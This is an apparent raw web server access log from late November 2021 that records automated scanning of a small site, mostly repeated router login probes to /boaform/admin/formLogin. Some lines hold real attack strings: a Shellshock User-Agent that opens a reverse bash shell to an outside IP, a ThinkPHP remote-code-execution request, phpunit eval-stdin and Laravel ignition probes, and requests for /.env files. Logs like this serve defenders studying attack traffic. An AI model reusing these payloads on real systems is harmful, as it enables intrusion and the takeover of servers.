195.133.18.118 - - [27/Nov/2021:21:52:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:52:33 +0000] "" 400 0 "-" "-"
115.195.103.82 - - [27/Nov/2021:21:58:46 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 162 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:01:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:01:03 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:06:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:06:18 +0000] "" 400 0 "-" "-"
205.185.124.100 - - [27/Nov/2021:22:10:00 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.124.100 - - [27/Nov/2021:22:10:00 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:12:40 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:12:40 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:19:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:19:33 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:29:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:29:39 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:36:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:36:09 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [27/Nov/2021:22:36:09 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
218.248.240.131 - - [27/Nov/2021:22:36:09 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:42:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:42:24 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:48:47 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:48:47 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:22:54:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:22:54:35 +0000] "" 400 0 "-" "-"
103.79.142.141 - - [27/Nov/2021:23:00:20 +0000] "POST /GponForm/diag_Form?style/ HTTP/1.1" 404 196 "-" "curl/7.3.2"
195.133.18.118 - - [27/Nov/2021:23:02:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:02:05 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [27/Nov/2021:23:05:07 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [27/Nov/2021:23:06:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:06:33 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [27/Nov/2021:23:12:10 +0000] "GET / HTTP/1.1" 200 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [27/Nov/2021:23:15:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:15:02 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:23:21:48 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:21:48 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:23:29:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:29:42 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:23:34:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:34:43 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [27/Nov/2021:23:36:09 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [27/Nov/2021:23:39:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:39:07 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [27/Nov/2021:23:43:57 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [27/Nov/2021:23:47:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:47:05 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:23:54:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:23:54:23 +0000] "" 400 0 "-" "-"
154.89.5.74 - - [27/Nov/2021:23:58:01 +0000] "GET / HTTP/1.0" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:00:03:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:03:49 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:00:10:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:10:39 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:00:13:00 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:13:00 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:00:21:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:21:10 +0000] "" 400 0 "-" "-"
192.241.195.204 - - [28/Nov/2021:00:22:59 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 183 "-" "Mozilla/5.0 zgrab/0.x"
195.133.18.118 - - [28/Nov/2021:00:26:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:26:12 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [28/Nov/2021:00:31:10 +0000] "GET / HTTP/1.1" 200 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:00:35:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:35:57 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [28/Nov/2021:00:36:13 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:00:40:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:40:03 +0000] "" 400 0 "-" "-"
219.94.246.47 - - [28/Nov/2021:00:42:07 +0000] "GET / HTTP/1.0" 200 41 "-" "() { :; }; /bin/bash -i >& /dev/tcp/202.61.199.103/15347 0<&1 2>&1"
218.248.240.131 - - [28/Nov/2021:00:44:00 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:00:46:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:46:03 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:00:55:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:55:06 +0000] "" 400 0 "-" "-"
198.98.49.124 - - [28/Nov/2021:00:58:26 +0000] "GET / HTTP/1.1" 200 72 "-" "Linux Gnu (cow)"
80.82.77.192 - - [28/Nov/2021:00:58:51 +0000] "GET / HTTP/1.1" 200 943 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:00:59:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:00:59:39 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:01:06:55 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:06:55 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:01:15:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:15:26 +0000] "" 400 0 "-" "-"
5.188.210.227 - - [28/Nov/2021:01:17:13 +0000] "\x05\x01\x00" 400 166 "-" "-"
5.188.210.227 - - [28/Nov/2021:01:18:16 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"
45.146.164.110 - - [28/Nov/2021:01:18:30 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.188.210.227 - - [28/Nov/2021:01:19:28 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 666 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:01:22:09 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:22:09 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:01:28:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:28:50 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:01:35:17 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:35:17 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [28/Nov/2021:01:36:23 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
218.248.240.131 - - [28/Nov/2021:01:36:23 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:01:40:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:40:54 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [28/Nov/2021:01:44:17 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:01:48:48 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:48:48 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:01:53:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:01:53:34 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:02:00:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:00:50 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:02:12:19 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:12:19 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:02:15:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:15:38 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:02:20:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:20:54 +0000] "" 400 0 "-" "-"
186.251.229.45 - - [28/Nov/2021:02:21:13 +0000] "GET / HTTP/1.1" 200 41 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:02:31:40 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:31:40 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:02:33:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:33:26 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [28/Nov/2021:02:36:24 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
69.194.182.218 - - [28/Nov/2021:02:40:57 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.194.182.218 - - [28/Nov/2021:02:40:58 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:02:42:53 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:42:54 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [28/Nov/2021:02:46:18 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:02:50:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:50:38 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:02:56:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:02:56:43 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:03:02:19 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:02:19 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:03:08:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:08:20 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:03:14:55 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:14:56 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:03:20:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:20:09 +0000] "" 400 0 "-" "-"
31.220.3.140 - - [28/Nov/2021:03:20:24 +0000] "GET / HTTP/1.1" 200 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
185.65.135.253 - - [28/Nov/2021:03:21:35 +0000] "GET / HTTP/1.1" 200 72 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'"
195.133.18.118 - - [28/Nov/2021:03:29:15 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:29:15 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:03:33:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:33:03 +0000] "" 400 0 "-" "-"
207.241.233.150 - - [28/Nov/2021:03:34:31 +0000] "GET /robots.txt HTTP/1.0" 301 178 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
207.241.233.150 - - [28/Nov/2021:03:34:33 +0000] "GET /robots.txt HTTP/1.0" 404 196 "http://danwand.in/robots.txt" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
207.241.233.150 - - [28/Nov/2021:03:34:34 +0000] "GET / HTTP/1.0" 301 178 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
106.75.211.240 - - [28/Nov/2021:03:37:08 +0000] "GET / HTTP/1.1" 400 264 "-" "Mozilla/5.0 zgrab/0.x"
2.57.122.27 - - [28/Nov/2021:03:38:59 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
2.57.122.27 - - [28/Nov/2021:03:38:59 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [28/Nov/2021:03:40:04 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:03:41:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:41:54 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [28/Nov/2021:03:44:48 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:03:46:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:46:12 +0000] "" 400 0 "-" "-"
157.230.216.203 - - [28/Nov/2021:03:46:16 +0000] "GET /ab2g HTTP/1.1" 400 166 "-" "-"
157.230.216.203 - - [28/Nov/2021:03:46:16 +0000] "GET /ab2h HTTP/1.1" 400 166 "-" "-"
195.133.18.118 - - [28/Nov/2021:03:54:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:03:54:34 +0000] "" 400 0 "-" "-"
185.104.71.136 - - [28/Nov/2021:03:58:51 +0000] "GET / HTTP/1.1" 200 41 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:04:02:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:02:08 +0000] "" 400 0 "-" "-"
66.240.205.34 - - [28/Nov/2021:04:03:06 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"
195.133.18.118 - - [28/Nov/2021:04:08:17 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:08:17 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:04:15:47 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:15:47 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:04:22:16 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:22:16 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:04:27:14 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
